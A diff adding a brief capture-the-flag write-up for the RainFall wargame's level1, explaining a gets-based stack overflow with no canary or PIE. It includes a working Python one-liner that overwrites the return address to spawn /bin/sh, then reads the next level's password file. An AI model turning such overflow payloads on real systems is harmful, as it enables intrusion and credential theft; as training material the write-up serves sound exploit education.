@@ -1,0 +1,19 @@
+# level1 → level2
+
+`main` reads unbounded input with `gets` into a 64-byte stack buffer. The
+saved return address is 76 bytes after the buffer start. `run` at
+`0x08048444` prints a message and calls `system("/bin/sh")`. The binary has
+no stack canary or PIE, so replacing the return address with `run` is enough.
+
+On the RainFall VM, from the level1 account:
+
+```sh
+(python2.7 -c 'import struct; print "A"*76 + struct.pack("<I", 0x08048444)'; cat) | ./level1
+id
+cat /home/user/level2/.pass
+```
+
+`cat` keeps the pipe open so commands can be entered in the spawned shell.
+To verify the offset, inspect `main` in GDB: the buffer begins at `esp+0x10`
+after stack allocation, and the saved return address is 76 bytes later.
+The address comes from `disassemble run`.
